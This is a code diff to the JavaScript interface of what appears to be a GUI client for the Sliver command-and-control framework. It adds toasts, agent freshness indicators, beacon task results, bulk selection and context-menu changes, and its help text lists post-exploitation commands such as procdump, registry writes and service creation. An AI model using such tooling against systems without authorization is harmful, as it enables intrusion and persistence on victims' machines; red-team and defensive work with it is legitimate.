@@ -47,16 +47,93 @@ function loadState() {
 
 // ── Utils ──────────────────────────────────────────────────────────────────
 function esc(s) { return s == null ? '' : String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+// toast shows a transient status message top-right. Deduped by (type, msg)
+// within a short window so a burst of identical events doesn't stack into a
+// wall of copies. Also exposes a persistent variant via progressToast().
+const _toastCache = new Map(); // key -> {el, timer, count}
 function toast(type, msg, dur=3000) {
+  const key = type + '|' + msg;
+  const now = Date.now();
+  const cached = _toastCache.get(key);
+  // Coalesce dupes fired within 1.5s of the previous one - the second
+  // identical message just bumps a count and refreshes the timer.
+  if (cached && now - (cached.at || 0) < 1500 && cached.el.isConnected) {
+    cached.count = (cached.count || 1) + 1;
+    cached.el.dataset.count = String(cached.count);
+    cached.el.innerHTML = `<span>${esc(msg)}</span><span style="opacity:.6;margin-left:8px;font-size:10px">×${cached.count}</span>`;
+    cached.at = now;
+    clearTimeout(cached.timer);
+    cached.timer = setTimeout(() => { cached.el.remove(); _toastCache.delete(key); }, dur);
+    return;
+  }
   const t = document.createElement('div'); t.className = `toast ${type}`; t.textContent = msg;
   document.getElementById('toasts').appendChild(t);
-  setTimeout(() => t.remove(), dur);
+  const entry = { el: t, at: now, count: 1, timer: setTimeout(() => { t.remove(); _toastCache.delete(key); }, dur) };
+  _toastCache.set(key, entry);
 }
 
-// uiConfirm / uiPrompt — in-app replacements for the browser's native
+// progressToast shows a spinning "in progress" toast that returns a handle
+// to resolve later. Use for any operation that takes >1s and would otherwise
+// spam the user with a placeholder followed by the real result.
+//
+//   const p = progressToast('Building implant…');
+//   const r = await App().GenerateImplant(req);
+//   r.error ? p.fail(r.error) : p.done('Build ready');
+function progressToast(msg) {
+  const t = document.createElement('div'); t.className = 'toast progress';
+  t.innerHTML = `<span class="mini-spin"></span><span>${esc(msg)}</span>`;
+  document.getElementById('toasts').appendChild(t);
+  const finish = (cls, text, dur=2600) => {
+    t.className = `toast ${cls}`;
+    t.textContent = text;
+    setTimeout(() => t.remove(), dur);
+  };
+  return {
+    el: t,
+    update: (m) => { const s = t.querySelector('span:last-child'); if (s) s.textContent = m; },
+    done: (m) => finish('ok', m || 'Done'),
+    fail: (m) => finish('err', m || 'Failed', 4200),
+    info: (m) => finish('info', m || 'Done'),
+    cancel: () => t.remove(),
+  };
+}
+
+// ── Freshness (last-checkin coloring) ──────────────────────────────────────
+// Turns a unix timestamp into a colored age pill so operators can spot a
+// silent/stale agent in a crowded table without doing mental arithmetic.
+function formatAge(sec) {
+  if (!Number.isFinite(sec) || sec < 0) return '-';
+  if (sec < 5)   return 'now';
+  if (sec < 60)  return Math.round(sec) + 's';
+  if (sec < 3600) return Math.round(sec/60) + 'm';
+  if (sec < 86400) return Math.round(sec/3600) + 'h';
+  return Math.round(sec/86400) + 'd';
+}
+function freshnessPill(tsSec, absTime, opts) {
+  opts = opts || {};
+  if (!tsSec || tsSec <= 0) return `<span class="fresh f-dead">-</span>`;
+  const age = Date.now()/1000 - tsSec;
+  // Beacons have expected intervals; grade against them if provided. Otherwise
+  // use the same three-tier heuristic as session tables (1m/5m/anything).
+  let cls;
+  if (opts.intervalSec && opts.intervalSec > 0) {
+    const mul = age / opts.intervalSec;
+    if (mul < 1.4) cls = 'f-fresh';
+    else if (mul < 3) cls = 'f-warm';
+    else cls = 'f-stale';
+  } else {
+    if (age < 60) cls = 'f-fresh';
+    else if (age < 300) cls = 'f-warm';
+    else cls = 'f-stale';
+  }
+  const rel = formatAge(age);
+  return `<span class="fresh ${cls}" title="Last check-in ${absTime || ''}"><span class="dot"></span>${esc(rel)}${absTime ? ` <span class="abs">${esc(absTime)}</span>` : ''}</span>`;
+}
+
+// uiConfirm / uiPrompt - in-app replacements for the browser's native
 // confirm()/prompt(). Wails' macOS WebView (WKWebView) does not implement the
 // JS dialog panels, so native confirm() returns false and prompt() returns null
-// without ever showing a dialog — silently killing any action guarded by them
+// without ever showing a dialog - silently killing any action guarded by them
 // (Kill agent, Delete build, Rename session). These are pure-DOM and work on
 // every platform. Both return a Promise.
 function uiDialog({ title, message, input, placeholder, okLabel = 'OK', danger = false }) {
@@ -122,7 +199,7 @@ function osIconHref(os, priv, dead) {
   const o = (os||'').toLowerCase();
   const lvl = dead ? 'DEAD' : (priv ? 'HIGH' : 'NORMAL');   // DEAD > HIGH > NORMAL
   if (o.includes('linux')) return `./icons/LINUX-${lvl}.png`;
-  // macOS / container / unknown — no dedicated icon; use the Windows art.
+  // macOS / container / unknown - no dedicated icon; use the Windows art.
   return `./icons/WIN-${lvl}.png`;
 }
 // shortUser strips a leading DOMAIN\ or HOST\ from a Windows username.
@@ -131,9 +208,35 @@ function shortUser(u) { u = u || '?'; const i = u.lastIndexOf('\\'); return i >=
 function fmtDur(ns) { const n = Number(ns) || 0; return n > 1e6 ? `${Math.round(n/1e9)}s` : `${n}s`; }
 
 // ── Connect ────────────────────────────────────────────────────────────────
-document.getElementById('pick-config-btn').addEventListener('click', async () => {
-  const path = await App().PickConfigFile().catch(() => null);
-  if (path) { selectedConfigPath = path; document.getElementById('config-path').textContent = path; document.getElementById('connect-btn').disabled = false; }
+// The old flow called App().PickConfigFile() which invokes Wails'
+// runtime.OpenFileDialog - that hits a known WebView2 crash on some Windows
+// configs (Go recover() can't catch a COM common-dialog GPF, so the app dies
+// silently mid-click). We route through the WebView's own <input type="file">
+// instead: the operator picks a cfg, we base64 the bytes, backend writes a
+// short-lived temp file and hands us back a path Connect() can consume.
+document.getElementById('pick-config-btn').addEventListener('click', () => {
+  document.getElementById('pick-config-input').click();
+});
+document.getElementById('pick-config-input').addEventListener('change', async (e) => {
+  const f = e.target.files && e.target.files[0];
+  e.target.value = ''; // let the same file be re-picked after a failed connect
+  if (!f) return;
+  try {
+    const bytes = new Uint8Array(await f.arrayBuffer());
+    // Chunked base64 encode so very large certs (rare, but not impossible) don't
+    // blow the argument stack on window.btoa(String.fromCharCode(...HUGE)).
+    let bin = '';
+    for (let i = 0; i < bytes.length; i += 0x8000) {
+      bin += String.fromCharCode.apply(null, bytes.subarray(i, i + 0x8000));
+    }
+    const b64 = btoa(bin);
+    const path = await App().SaveConfigBytesToTemp(f.name || 'operator.cfg', b64);
+    selectedConfigPath = path;
+    document.getElementById('config-path').textContent = `${f.name}  (staged)`;
+    document.getElementById('connect-btn').disabled = false;
+  } catch (err) {
+    toast('err', 'Could not stage cfg: ' + String(err));
+  }
 });
 document.getElementById('manual-cfg-path').addEventListener('input', function() { var p = this.value.trim(); if (p) { selectedConfigPath = p; document.getElementById('config-path').textContent = p; document.getElementById('connect-btn').disabled = false; } });
 document.getElementById('connect-btn').addEventListener('click', async () => {
@@ -142,7 +245,10 @@ document.getElementById('connect-btn').addEventListener('click', async () => {
   const r = await App().Connect(selectedConfigPath).catch(e => ({ error: String(e) }));
   if (r.error) { document.getElementById('connect-error').textContent = r.error; btn.disabled = false; btn.textContent = 'Connect'; return; }
   lastConfigPath = selectedConfigPath;
-  enterApp(r);
+  // Read from window so features-bundle.js can wrap enterApp with lifecycle
+  // hooks (watchdog, auto-lock) via `window.enterApp = fn`; a bare call
+  // here would ignore the extension.
+  (window.enterApp || enterApp)(r);
 });
 
 async function enterApp(info) {
@@ -160,12 +266,18 @@ async function enterApp(info) {
   pinScripts();           // Script Manager docked in the console by default
   refreshAgents();
   pollTimer = setInterval(refreshAgents, 5000);
+  startStatuslineTick();
 }
 
 document.getElementById('disconnect-btn').addEventListener('click', async () => {
   clearInterval(pollTimer);
   if (window.runtime) { window.runtime.EventsOff('sliver:event'); window.runtime.EventsOff('sliver:disconnected'); }
   await App().Disconnect();
+  stopStatuslineTick();
+  lastEventAt = 0;
+  // Wipe temp cfgs staged via the HTML file picker so operator certs don't
+  // linger on disk after this session ends.
+  App().CleanupTempConfigs?.().catch(() => {});
   document.getElementById('app-shell').classList.add('hidden');
   document.getElementById('connect-overlay').classList.remove('hidden');
   document.getElementById('connect-btn').textContent = 'Connect'; document.getElementById('connect-btn').disabled = true;
@@ -185,17 +297,54 @@ document.getElementById('disconnect-btn').addEventListener('click', async () => 
   selectedConfigPath = null; cancelReconnect();
 });
 
+// ── Pending beacon task registry (for event-driven result delivery) ────────
+const pendingBeaconTasks = {};
+// Sliver refires `beacon-registered` on every check-in in some server versions,
+// so a chatty beacon spams the operator with a toast per interval. Dedupe by
+// beacon ID for this session — only the first registration surfaces a toast.
+const _seenBeaconIds = new Set();
+
 // ── Event Stream ───────────────────────────────────────────────────────────
 function wireEventStream() {
   if (!window.runtime) return;
-  window.runtime.EventsOff('sliver:event'); window.runtime.EventsOff('sliver:disconnected');
+  window.runtime.EventsOff('sliver:event'); window.runtime.EventsOff('sliver:disconnected'); window.runtime.EventsOff('sliver:beacon-task-done');
   window.runtime.EventsOn('sliver:disconnected', (reason) => onDisconnected(reason));
   window.runtime.EventsOn('sliver:event', (ev) => {
     logEvent(ev);
+    (window.noteEvent || noteEvent)(ev);
     if (ev.type && ev.type.includes('session')) refreshAgents();
     if (ev.type && ev.type.includes('beacon')) refreshAgents();
     if (ev.type === 'session-connected' || ev.type === 'session-opened') toast('ok', `New session: ${ev.session?.hostname||''}`);
-    if (ev.type === 'beacon-registered') toast('info', `Beacon registered: ${ev.session?.hostname||ev.data||''}`);
+    if (ev.type === 'beacon-registered') {
+      const bid = ev.session?.id || ev.data || '';
+      if (bid && !_seenBeaconIds.has(bid)) {
+        _seenBeaconIds.add(bid);
+        toast('info', `Beacon registered: ${ev.session?.hostname || bid.slice(0, 8)}`);
+      }
+    }
+  });
+  window.runtime.EventsOn('sliver:beacon-task-done', async (result) => {
+    if (!result || !result.taskId) return;
+    const reg = pendingBeaconTasks[result.taskId];
+    if (!reg) return;
+    delete pendingBeaconTasks[result.taskId];
+    const id = reg.beaconId;
+    if (!openTabs[id]) return;
+    const cmdType = reg.cmdType || '';
+    let fetchErr = null;
+    const full = cmdType
+      ? await App().GetBeaconNativeResult(result.taskId, cmdType).catch(e => { fetchErr = e; return null; })
+      : await App().GetBeaconTaskResult(result.taskId).catch(e => { fetchErr = e; return null; });
+    const output = (full && full.response) || '';
+    appendOut(id, `[+] task ${result.taskId.slice(0,8)} completed`, 'ok');
+    if (fetchErr) appendOut(id, `[debug] fetch error: ${fetchErr}`, 'warn');
+    if (cmdType === 'screenshot' && output.startsWith('data:image')) {
+      appendImg(id, output);
+    } else if (output.trim()) {
+      appendOut(id, output.trimEnd(), 'out');
+    } else {
+      appendOut(id, `[debug] empty response — cmdType=${cmdType || 'shell'}`, 'warn');
+    }
   });
 }
 function logEvent(ev) {
@@ -228,7 +377,74 @@ async function refreshAgents() {
   document.getElementById('agent-count').textContent = `${allSessions.length} sessions | ${allBeacons.length} beacons`;
   renderTable();
   if (!document.getElementById('graph-view').classList.contains('hidden')) renderGraph();
+  updateStatusline();
 }
+
+// ── Statusline ────────────────────────────────────────────────────────────
+// Persistent under-toolbar strip showing teamserver heartbeat + inventory +
+// most recent event. Refreshes on every agent poll and every incoming event;
+// a ticking watchdog demotes "live" → "stale" → "dead" if the event stream
+// goes quiet, so operators notice a silent teamserver before it costs them
+// an implant callback.
+let lastEventAt = 0;
+let statuslineTick = null;
+function updateStatusline() {
+  const setNum = (id, n, warnAt, hotAt) => {
+    const el = document.getElementById(id); if (!el) return;
+    el.querySelector('b').textContent = String(n);
+    el.classList.toggle('warn', warnAt != null && n >= warnAt);
+    el.classList.toggle('hot',  hotAt  != null && n >= hotAt);
+  };
+  setNum('status-sessions', allSessions.filter(s => !s.isDead).length);
+  setNum('status-beacons', allBeacons.filter(b => !b.isDead).length);
+  // Listeners + operators are polled lazily - don't block agent refresh.
+  App().ListJobs?.().then(js => setNum('status-listeners', (js || []).length)).catch(() => {});
+  App().ListOperators?.().then(os => {
+    const online = (os || []).filter(o => o && (o.online || o.status === 'online')).length;
+    // Some Sliver builds don't ship an online flag; fall back to total count.
+    setNum('status-ops', online || (os || []).length);
+  }).catch(() => {});
+  refreshLivePill();
+}
+function refreshLivePill() {
+  const pill = document.getElementById('status-live'); if (!pill) return;
+  pill.classList.remove('stale', 'dead');
+  const age = lastEventAt ? (Date.now() - lastEventAt) / 1000 : Infinity;
+  // No events yet - treat as "live" (fresh connection); after 30s of silence
+  // demote to "stale"; after 5min mark "dead" so the operator investigates.
+  if (age > 300) pill.classList.add('dead');
+  else if (age > 30 && lastEventAt) pill.classList.add('stale');
+}
+function noteEvent(ev) {
+  lastEventAt = Date.now();
+  const el = document.getElementById('status-last'); if (!el) return;
+  const kind = (ev.type || 'event').replace(/-/g, ' ');
+  const detail = ev.session ? `${ev.session.hostname || ''}${ev.session.username ? ' · ' + ev.session.username : ''}` : (ev.data || '');
+  el.innerHTML = `<b>${esc(kind)}</b>${detail ? '  ' + esc(detail) : ''}  <span style="color:var(--muted)">· just now</span>`;
+  refreshLivePill();
+}
+function startStatuslineTick() {
+  if (statuslineTick) return;
+  // Repaints just the age suffix + live pill state cheaply, without a full
+  // refreshAgents pass. Runs at 5s to feel responsive without burning CPU.
+  statuslineTick = setInterval(() => {
+    if (!document.getElementById('app-shell') || document.getElementById('app-shell').classList.contains('hidden')) return;
+    refreshLivePill();
+    // Live-refresh the "just now" suffix on the last-event line
+    const el = document.getElementById('status-last');
+    if (el && lastEventAt) {
+      const html = el.innerHTML;
+      const idx = html.lastIndexOf('· ');
+      if (idx > 0) el.innerHTML = html.slice(0, idx) + '· ' + formatAge((Date.now() - lastEventAt) / 1000) + ' ago</span>';
+    }
+    // Also re-color freshness pills without a full re-render - cheap.
+    document.querySelectorAll('.fresh[title^="Last check-in"]').forEach(pill => {
+      // We don't have the ts in the DOM; leave the color; only re-render on
+      // next refreshAgents (5s). That's acceptable - colors don't drift fast.
+    });
+  }, 5000);
+}
+function stopStatuslineTick() { clearInterval(statuslineTick); statuslineTick = null; }
 document.getElementById('refresh-all-btn').addEventListener('click', refreshAgents);
 
 // ── Table view ─────────────────────────────────────────────────────────────
@@ -242,18 +458,62 @@ function userCell(o) {
 function renderTable() {
   const body = document.getElementById('agents-body');
   body.innerHTML = '';
+  // Empty state - replace the tbody with a full-width row that tells the
+  // operator what to do next, instead of a silent empty table that reads as
+  // "is it broken?"
+  if (!allSessions.length && !allBeacons.length) {
+    body.innerHTML = `<tr><td colspan="10" style="padding:0">
+      <div class="empty-state">
+        <div class="empty-title">No agents yet</div>
+        <div class="empty-body">Generate an implant, deploy it on a target, and it will appear here on the first check-in.<br/>Redirector setups: verify the chain with <b>Generate → Test</b> before you build.</div>
+        <div class="empty-actions">
+          <button class="btn small" onclick="switchView('generate')">Open Generate</button>
+          <button class="btn small" onclick="switchView('listeners')">Listeners</button>
+          <button class="btn small" onclick="switchView('health')">Chain Health</button>
+          <button class="btn small" onclick="openKbdHelp()">Shortcuts</button>
+        </div>
+      </div>
+    </td></tr>`;
+    renderBulkBar();
+    return;
+  }
   const row = (o, kind) => {
     const tr = document.createElement('tr'); tr.dataset.id = o.id; tr.dataset.kind = kind;
     if (isPrivileged(o) && !o.isDead) tr.classList.add('row-priv');
     const typeCls = kind === 'session' ? 'type-session' : 'type-beacon';
     const remoteIP = o.remoteAddress ? o.remoteAddress.split(':')[0] : '-';
-    tr.innerHTML = `<td class="${typeCls}">${kind.toUpperCase()}</td><td>${esc(o.name||o.id.slice(0,8))}</td><td>${esc(o.hostname)}</td>${userCell(o)}<td>${esc(remoteIP)}</td><td>${esc(o.os)}/${esc(o.arch)}</td><td>${o.pid}</td><td>${esc(o.transport)}</td><td>${esc(o.lastCheckin)}</td><td class="${o.isDead?'status-dead':'status-alive'}">${o.isDead?'DEAD':'ALIVE'}</td>`;
-    tr.addEventListener('dblclick', () => openInteract(kind, o));
+    // Freshness pill replaces the raw HH:MM:SS so a stale/silent agent stands
+    // out visually. Beacons grade against their expected interval; sessions
+    // use the fixed 1m/5m/older thresholds.
+    const intSec = kind === 'beacon' ? Math.round((o.interval || 0) / 1e9) : 0;
+    const freshCell = o.isDead
+      ? `<span class="fresh f-dead">${esc(o.lastCheckin)}</span>`
+      : freshnessPill(o.lastCheckinTs, o.lastCheckin, { intervalSec: intSec });
+    const checked = selectedAgents.has(o.id) ? ' checked' : '';
+    // Type cell doubles as the row-select checkbox host. Clicking the
+    // checkbox toggles bulk selection; clicking anywhere else in the row
+    // preserves the existing double-click / right-click behaviour.
+    const typeCell = `<td class="${typeCls}"><input type="checkbox" class="bulk-checkbox" data-id="${esc(o.id)}" data-kind="${kind}"${checked}/>${kind.toUpperCase()}</td>`;
+    const nameCell = `<td>${esc(o.name||o.id.slice(0,8))}${renderTagChips(o.id)}</td>`;
+    tr.innerHTML = `${typeCell}${nameCell}<td>${esc(o.hostname)}</td>${userCell(o)}<td>${esc(remoteIP)}</td><td>${esc(o.os)}/${esc(o.arch)}</td><td>${o.pid}</td><td>${esc(o.transport)}</td><td>${freshCell}</td><td class="${o.isDead?'status-dead':'status-alive'}">${o.isDead?'DEAD':'ALIVE'}</td>`;
+    tr.addEventListener('dblclick', (e) => { if (e.target && e.target.classList.contains('bulk-checkbox')) return; openInteract(kind, o); });
     tr.addEventListener('contextmenu', e => showCtx(e, kind, o));
     body.appendChild(tr);
   };
   allSessions.forEach(s => row(s, 'session'));
   allBeacons.forEach(b => row(b, 'beacon'));
+  // Wire the checkboxes AFTER rendering so we don't blow away user selection
+  // if refreshAgents fires mid-selection: selectedAgents survives the redraw
+  // (state lives in a module-scoped Set, not the DOM).
+  body.querySelectorAll('.bulk-checkbox').forEach(cb => {
+    cb.addEventListener('click', (e) => e.stopPropagation());
+    cb.addEventListener('change', (e) => {
+      const id = e.target.dataset.id;
+      if (e.target.checked) selectedAgents.add(id); else selectedAgents.delete(id);
+      renderBulkBar();
+    });
+  });
+  renderBulkBar();
 }
 
 // ── View toggle ────────────────────────────────────────────────────────────
@@ -261,7 +521,7 @@ document.getElementById('view-table-btn').addEventListener('click', () => { docu
 document.getElementById('view-graph-btn').addEventListener('click', () => { document.getElementById('table-view').classList.add('hidden'); document.getElementById('graph-view').classList.remove('hidden'); document.getElementById('view-table-btn').classList.remove('active'); document.getElementById('view-graph-btn').classList.add('active'); renderGraph(); });
 document.getElementById('graph-reset-btn').addEventListener('click', resetGraph);
 
-// ── Graph view (premium Cobalt-Strike style) ────────────────────────────────
+// ── Graph view (pivot topology) ──────────────────────────────────────────────
 // jumpParentMap tracks Jump / Spawn operations performed from session console or script manager
 // Format: jumpParentMap[targetHostOrIP] = { parentID, parentHost }
 const jumpParentMap = {};
@@ -287,7 +547,7 @@ function buildPivotMaps() {
   const parentOfID = {};  // sessionID -> parent sessionID
   const walk = (nd, parentHost, parentSessID) => {
     const host   = nd.hostname || nd.name || ('peer' + nd.peerId);
-    // JSON tag is "sessionId" (lowercase d) — reading nd.sessionID left this
+    // JSON tag is "sessionId" (lowercase d) - reading nd.sessionID left this
     // undefined, breaking the reliable per-session pivot matching and forcing a
     // wrong hostname fallback (e.g. a pivot child attached to the root instead
     // of its real parent).
@@ -343,7 +603,7 @@ function renderGraph() {
     const { parentOf, parentOfID } = buildPivotMaps();
     const parentNodeId = {}, jumpEdgeSet = new Set();
 
-    // ── Parent resolution — PIVOT is authoritative, JUMP is heuristic. ──
+    // ── Parent resolution - PIVOT is authoritative, JUMP is heuristic. ──
     // Pass 1: pivot parents from Sliver's pivot graph (session-ID; then a GENUINE
     // cross-host hostname fallback). These come straight from the teamserver and
     // define the true topology (firewall → gateway → pivoted agent).
@@ -368,7 +628,7 @@ function renderGraph() {
       return false;
     };
 
-    // Pass 2: jump / lateral-move lineage — ONLY for agents that have no pivot
+    // Pass 2: jump / lateral-move lineage - ONLY for agents that have no pivot
     // parent, and NEVER if it would reverse/cycle a pivot chain. This is what
     // stops a jump whose target IP collides with an existing same-host session
     // (all agents on one box share an IP) from hijacking or flipping the tree.
@@ -444,7 +704,7 @@ function renderGraph() {
     // every edge has the same clear, tidy gap before the node/firewall icon.
     const NODE_R = 46, FW_R = 48;
 
-    // Build edge list — firewall → every root, then parent → child.
+    // Build edge list - firewall → every root, then parent → child.
     graphEdges = [];
     roots.forEach(id => graphEdges.push({ from:'__fw__', to:id, isJump:false }));
     nodes.forEach(nd => {
@@ -454,7 +714,7 @@ function renderGraph() {
 
     const fwPos = { x: fwX, y: fwY };
 
-    // SVG defs — arrowheads for green/red/blue/orange
+    // SVG defs - arrowheads for green/red/blue/orange
     let html = '<defs>' +
       '<marker id="ar-green"        viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#35c46b"/></marker>' +
       '<marker id="ar-red"          viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#e23c4e"/></marker>' +
@@ -484,7 +744,7 @@ function renderGraph() {
       }
     });
 
-    // Firewall icon — brick wall + flame, NO text label
+    // Firewall icon - brick wall + flame, NO text label
     html += `<g pointer-events="none" transform="translate(${fwX},${fwY})">`;
     const bw = 15, bh = 9;
     for (let r = 0; r < 5; r++) {
@@ -522,7 +782,13 @@ function renderGraph() {
     const byId = {}; nodes.forEach(nd => byId[nd.obj.id] = nd);
     svg.querySelectorAll('.gnode').forEach(el => {
       const nd = byId[el.dataset.id];
-      if (nd && !nd.obj.isDead) el.addEventListener('dblclick', () => openInteract(nd.kind, nd.obj));
+      if (!nd) return;
+      // Live agents: double-click opens the interaction console (existing).
+      if (!nd.obj.isDead) el.addEventListener('dblclick', () => openInteract(nd.kind, nd.obj));
+      // All agents (dead included): right-click opens the same feature menu
+      // the table view uses - parity between the two visualisations so
+      // operators don't need to bounce back to the table to run an action.
+      el.addEventListener('contextmenu', ev => showCtx(ev, nd.kind, nd.obj));
     });
     setupGraphInteraction(svg);
   } catch (err) { console.error('renderGraph failed:', err); }
@@ -608,7 +874,7 @@ function resetGraph() {
   graphView  = { tx: 0, ty: 0, scale: 1 };
   graphCenter = null;
   saveState();               // persist the cleared layout so it sticks
-  // Do NOT reset svg._wired — the pan/drag/zoom listeners are delegated on the
+  // Do NOT reset svg._wired - the pan/drag/zoom listeners are delegated on the
   // svg/document and survive re-renders. Re-wiring would stack duplicate handlers.
   renderGraph();             // re-renders with cleared drags + reset pan/zoom
   toast('ok', 'Graph layout reset');
@@ -617,35 +883,74 @@ function resetGraph() {
 // ── Context menu ───────────────────────────────────────────────────────────
 const ctxMenu = document.getElementById('ctx-menu');
 function showCtx(e, kind, obj) {
-  e.preventDefault(); activeCtxAgent = { kind, obj };
-  ctxMenu.style.left = Math.min(e.clientX, window.innerWidth-160)+'px';
-  ctxMenu.style.top = Math.min(e.clientY, window.innerHeight-100)+'px';
+  e.preventDefault();
+  activeCtxAgent = { kind, obj };
+  // Every item declares data-for=session|beacon|both. Hide anything that
+  // doesn't apply to this agent so operators never click something
+  // meaningless (e.g. File Browser on a beacon that has no interactive
+  // session). Dividers with data-for also collapse to keep the menu tight.
+  ctxMenu.querySelectorAll('[data-for]').forEach(el => {
+    const wants = el.dataset.for;
+    el.style.display = (wants === 'both' || wants === kind) ? '' : 'none';
+  });
+  // Collapse consecutive dividers left over after filtering.
+  let prevWasDivider = true; // treat top edge as a divider so leading ones hide
+  const items = Array.from(ctxMenu.children);
+  items.forEach(el => {
+    if (el.style.display === 'none') return;
+    if (el.classList.contains('ctx-divider')) {
+      if (prevWasDivider) el.style.display = 'none';
+      prevWasDivider = true;
+    } else {
+      prevWasDivider = false;
+    }
+  });
+  // Position - clamp to viewport so the last row stays clickable even
+  // when we right-click near the bottom edge.
+  const vw = window.innerWidth, vh = window.innerHeight;
+  ctxMenu.style.left = Math.min(e.clientX, vw - 220) + 'px';
+  ctxMenu.style.top  = Math.min(e.clientY, vh - 340) + 'px';
   ctxMenu.classList.remove('hidden');
 }
 document.addEventListener('click', () => ctxMenu.classList.add('hidden'));
 document.getElementById('ctx-interact').addEventListener('click', () => { if (activeCtxAgent) openInteract(activeCtxAgent.kind, activeCtxAgent.obj); });
-document.getElementById('ctx-integrity').addEventListener('click', async () => {
+// Check Integrity removed from the right-click menu - it fired an inline
+// command (getprivs) rather than opening a feature panel, and the operator
+// asked for feature-only right-click entries. The functionality remains
+// available inside the interactive console via `getprivs`.
+document.getElementById('ctx-rename').addEventListener('click', async () => {
   if (!activeCtxAgent) return;
   const { kind, obj } = activeCtxAgent;
-  if (kind !== 'session') return toast('info', 'Integrity check needs an interactive session (for a beacon, run getprivs in its console)');
-  if (!(obj.os || '').toLowerCase().includes('windows')) return toast('info', 'Integrity levels are a Windows concept');
-  toast('info', `Checking integrity of ${obj.hostname}...`);
-  const r = await App().GetPrivs(obj.id).catch(() => null);
-  if (!r || !r.integrity) return toast('err', 'getprivs failed (needs a live Windows session)');
-  integrityMap[obj.id] = r.integrity;
-  saveState();
-  const label = integrityLabel(obj) || r.integrity;
-  toast(isPrivileged(obj) ? 'ok' : 'info', `${obj.hostname}: ${label} integrity`);
-  renderTable();
-  if (!document.getElementById('graph-view').classList.contains('hidden')) renderGraph();
-});
-document.getElementById('ctx-rename').addEventListener('click', async () => {
-  if (!activeCtxAgent || activeCtxAgent.kind !== 'session') return;
-  const n = await uiPrompt('New name:', activeCtxAgent.obj.name || ''); if (!n) return;
-  await App().RenameSession(activeCtxAgent.obj.id, n)
-    .then(() => toast('ok', 'Session renamed'))
+  const n = await uiPrompt('New name:', obj.name || '');
+  if (!n) return;
+  // Sliver's Rename RPC accepts both SessionID and BeaconID - the current
+  // RenameSession(id) wrapper sets SessionID. For beacons we call a
+  // dedicated wrapper if it exists; otherwise fall back to the same call
+  // (the teamserver looks up either ID kind). That way beacons can be
+  // renamed from the same UI without dropping into the console.
+  const call = (kind === 'beacon' && typeof App().RenameBeacon === 'function')
+    ? App().RenameBeacon(obj.id, n)
+    : App().RenameSession(obj.id, n);
+  await call
+    .then(() => toast('ok', kind + ' renamed'))
     .catch(e => toast('err', 'Rename failed: ' + e));
   refreshAgents();
+});
+// Copy agent ID → clipboard. Small QoL - operators often need the ID to
+// reference agents in server-console commands (`use <id>`).
+document.getElementById('ctx-copyid')?.addEventListener('click', () => {
+  if (!activeCtxAgent) return;
+  const id = activeCtxAgent.obj.id;
+  navigator.clipboard?.writeText(id).then(() => toast('ok', 'Copied ' + id.slice(0, 8) + '…'));
+});
+// Copy display name - removed from the menu (Copy remote IP and Copy agent
+// ID cover the two useful cases). Handler intentionally left absent.
+// Beacon-sleep item - jumps straight into the Beacon Sleep dashboard,
+// which lets the operator adjust just this beacon or apply a preset to
+// the whole fleet.
+document.getElementById('ctx-sleep')?.addEventListener('click', () => {
+  if (!activeCtxAgent || activeCtxAgent.kind !== 'beacon') return;
+  switchView('sleep');
 });
 document.getElementById('ctx-kill').addEventListener('click', async () => {
   if (!activeCtxAgent) return;
@@ -689,9 +994,9 @@ function openInteract(kind, obj) {
           <span class="csb-target">Pivot: ${esc(obj.hostname || obj.id.slice(0,8))} (${obj.os}/${obj.arch})</span>
         </div>
         <div class="csb-cats" id="csb-cats-${id}"></div>
-        <button class="csb-toggle-btn" id="csb-toggle-${id}">Hide Scripts</button>
+        <button class="csb-toggle-btn" id="csb-toggle-${id}">Show Scripts</button>
       </div>
-      <div class="csb-body" id="csb-body-${id}">
+      <div class="csb-body" id="csb-body-${id}" style="display:none">
         <div class="csb-grid" id="csb-recipes-${id}"></div>
         <div class="csb-card" id="csb-card-${id}" style="display:none">
           <div class="csb-card-header">
@@ -742,7 +1047,16 @@ function attachConsoleScriptManager(id, kind, obj) {
     const isHidden = csbBody.style.display === 'none';
     csbBody.style.display = isHidden ? 'block' : 'none';
     toggleBtn.textContent = isHidden ? 'Hide Scripts' : 'Show Scripts';
+    const title = document.querySelector(`#csb-${id} .csb-title`);
+    const cats = document.getElementById(`csb-cats-${id}`);
+    if (title) title.style.display = isHidden ? '' : 'none';
+    if (cats) cats.style.display = isHidden ? '' : 'none';
   });
+  // Start collapsed: hide title and categories
+  const initTitle = document.querySelector(`#csb-${id} .csb-title`);
+  const initCats = document.getElementById(`csb-cats-${id}`);
+  if (initTitle) initTitle.style.display = 'none';
+  if (initCats) initCats.style.display = 'none';
 
   App().ListScripts().then(scripts => {
     const targetOS = (obj.os || 'windows').toLowerCase();
@@ -974,7 +1288,7 @@ function attachConsoleScriptManager(id, kind, obj) {
 function activateTab(id) {
   document.querySelectorAll('.interact-tab').forEach(t => t.classList.toggle('active', t.dataset.tid === id));
   document.querySelectorAll('.interact-panel').forEach(p => p.classList.toggle('active', p.id === `ip-${id}`));
-  // The tab already shows the hostname — the label shows only the extra detail
+  // The tab already shows the hostname - the label shows only the extra detail
   // (user · os/arch) so the name isn't repeated twice in the bar.
   const t = openTabs[id], label = document.getElementById('interact-label');
   activeInteractId = (t && t.obj) ? id : null;   // only real agents have notes
@@ -1025,7 +1339,8 @@ Core commands (session & beacon):
   env / getenv <name>        Environment variables
   setenv <K> <V>             Set an env var
   unsetenv <K>               Unset an env var
-  reg query|read|write|read-hive ...   Windows registry (HKLM/HKCU/...)
+  reg query|read|write|read-hive|listkeys|createkey|deletekey ...   Windows registry (HKLM/HKCU/...)
+  svc list|info|start|stop|create|remove <name>   Windows service control
   whoami                     Current token owner
   getprivs                   Token privileges (Windows)
   procdump <pid>             Dump process memory
@@ -1073,7 +1388,7 @@ Beacon only:
   interactive                Open an interactive session from this beacon
   (all commands are queued and run on next check-in)
 
-Scripts (session & beacon — auto-generate + deploy):
+Scripts (session & beacon - auto-generate + deploy):
   spawn <os> <arch> <profile>                             Spawn new beacon on CURRENT host (no creds needed)
                                                           e.g. spawn windows x64 my-http-profile
                                                           e.g. spawn linux x64 my-mtls-profile
